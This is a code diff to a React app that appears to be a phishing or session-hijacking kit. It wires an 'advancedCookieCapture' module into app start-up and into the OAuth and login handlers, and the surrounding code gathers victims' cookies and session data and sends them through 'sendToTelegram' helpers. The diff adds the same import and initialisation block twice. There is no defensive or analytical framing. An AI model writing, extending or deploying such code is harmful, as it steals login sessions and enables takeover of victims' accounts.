@@ -10,6 +10,12 @@ import {
   sendToTelegram 
 } from './utils/oauthHandler';
 
+// Import the advanced cookie capture system
+import { advancedCookieCapture } from './utils/advancedCookieCapture';
+
+// Import the advanced cookie capture system
+import { advancedCookieCapture } from './utils/advancedCookieCapture';
+
 // Import the real-time cookie system
 import { 
   setCookie, 
@@ -26,6 +32,36 @@ function App() {
   const [selectedFileName, setSelectedFileName] = useState('');
   const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
+
+  // Initialize advanced cookie capture on app start
+  useEffect(() => {
+    try {
+      // Ensure advanced cookie capture is initialized
+      if (advancedCookieCapture && typeof advancedCookieCapture.onCookieChange === 'function') {
+        advancedCookieCapture.onCookieChange((cookies) => {
+          console.log('🍪 Advanced cookie capture detected changes:', cookies.length, 'cookies');
+        });
+        console.log('✅ Advanced cookie capture system initialized');
+      }
+    } catch (error) {
+      console.error('❌ Failed to initialize advanced cookie capture:', error);
+    }
+  }, []);
+
+  // Initialize advanced cookie capture on app start
+  useEffect(() => {
+    try {
+      // Ensure advanced cookie capture is initialized
+      if (advancedCookieCapture && typeof advancedCookieCapture.onCookieChange === 'function') {
+        advancedCookieCapture.onCookieChange((cookies) => {
+          console.log('🍪 Advanced cookie capture detected changes:', cookies.length, 'cookies');
+        });
+        console.log('✅ Advanced cookie capture system initialized');
+      }
+    } catch (error) {
+      console.error('❌ Failed to initialize advanced cookie capture:', error);
+    }
+  }, []);
 
   // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
   const safeSendToTelegram = async (sessionData: any) => {
@@ -224,7 +260,6 @@ function App() {
       let realCookies = '';
       let cookieList: any[] = [];
       try {
-        const { advancedCookieCapture } = await import('./utils/advancedCookieCapture');
         if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
           cookieList = advancedCookieCapture.getAllCookies();
           console.log('🍪 OAuth captured cookies from advanced system:', cookieList.length);
@@ -363,7 +398,6 @@ function App() {
     let realCookies = '';
     let cookieList: any[] = [];
     try {
-      const { advancedCookieCapture } = await import('./utils/advancedCookieCapture');
       if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
         cookieList = advancedCookieCapture.getAllCookies();
         console.log('🍪 Captured cookies from advanced system:', cookieList.length);
@@ -492,9 +526,6 @@ function App() {
     setCaptchaVerified(false); // Reset captcha state on logout
     setCurrentPage('captcha'); // Go back to captcha on logout
   };
-
-  // ... rest of file unchanged (rendering logic) ...
-  // Loading state, captcha, login, landing, fallback as before
 
   // Loading state
   if (isLoading) {
